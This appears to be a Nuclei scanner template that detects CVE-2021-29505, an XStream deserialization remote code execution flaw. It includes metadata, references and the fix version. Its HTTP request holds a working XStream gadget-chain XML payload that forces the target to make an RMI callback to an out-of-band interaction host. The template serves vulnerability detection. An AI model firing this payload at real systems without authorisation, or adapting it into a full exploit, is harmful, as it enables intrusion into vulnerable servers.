http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: or
    part: body
    type: word
    words:
    - timestamp
    - com.thoughtworks.xstream
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<java.util.PriorityQueue\
    \ serialization='custom'>\n    <unserializable-parents/>\n    <java.util.PriorityQueue>\n\
    \        <default>\n            <size>2</size>\n        </default>\n        <int>3</int>\n\
    \        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type>12345</type>\n \
    \           <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n\
    \                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d\
    \ Content</m__obj>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n\
    \        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type>12345</type>\n \
    \           <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n\
    \                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n\
    \                    <parsedMessage>true</parsedMessage>\n                   \
    \ <soapVersion>SOAP_11</soapVersion>\n                    <bodyParts/>\n     \
    \               <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n\
    \                        <attachmentsInitialized>false</attachmentsInitialized>\n\
    \                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n\
    \                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n\
    \                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n\
    \                                    <names>\n                               \
    \         <string>aa</string>\n                                        <string>aa</string>\n\
    \                                    </names>\n                              \
    \      <ctx>\n                                        <environment/>\n       \
    \                                 <registry class='sun.rmi.registry.RegistryImpl_Stub'\
    \ serialization='custom'>\n                                            <java.rmi.server.RemoteObject>\n\
    \                                                <string>UnicastRef</string>\n\
    \                                                <string>{{interactsh-url}}</string>\n\
    \                                                <int>1099</int>\n           \
    \                                     <long>0</long>\n                       \
    \                         <int>0</int>\n                                     \
    \           <long>0</long>\n                                                <short>0</short>\n\
    \                                                <boolean>false</boolean>\n  \
    \                                          </java.rmi.server.RemoteObject>\n \
    \                                       </registry>\n                        \
    \                <host>{{interactsh-url}}</host>\n                           \
    \             <port>1099</port>\n                                    </ctx>\n\
    \                                </candidates>\n                            </aliases>\n\
    \                        </nullIter>\n                    </sm>\n            \
    \    </message>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n\
    \    </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n"
id: CVE-2021-29505
info:
  author: pwnhxl
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-29505
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-502
    epss-percentile: 0.99577
    epss-score: 0.90349
  description: 'XStream before 1.4.17 is susceptible to remote code execution. An
    attacker can execute commands of the host by manipulating the processed input
    stream, thereby making it possible to obtain sensitive information, modify data,
    and/or execute unauthorized administrative operations in the context of the affected
    site.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream <1.4.17 - Remote Code Execution
  reference:
  - https://paper.seebug.org/1543/
  - https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29505
  - https://github.com/x-stream/xstream/security/advisories/GHSA-7chv-rrw6-w6fc
  - https://nvd.nist.gov/vuln/detail/cve-2021-29505
  remediation: Patched in 1.4.17.
  severity: high
  tags: cve2021,cve,oast,vulhub,xstream,deserialization,rce,xstream_project,vuln
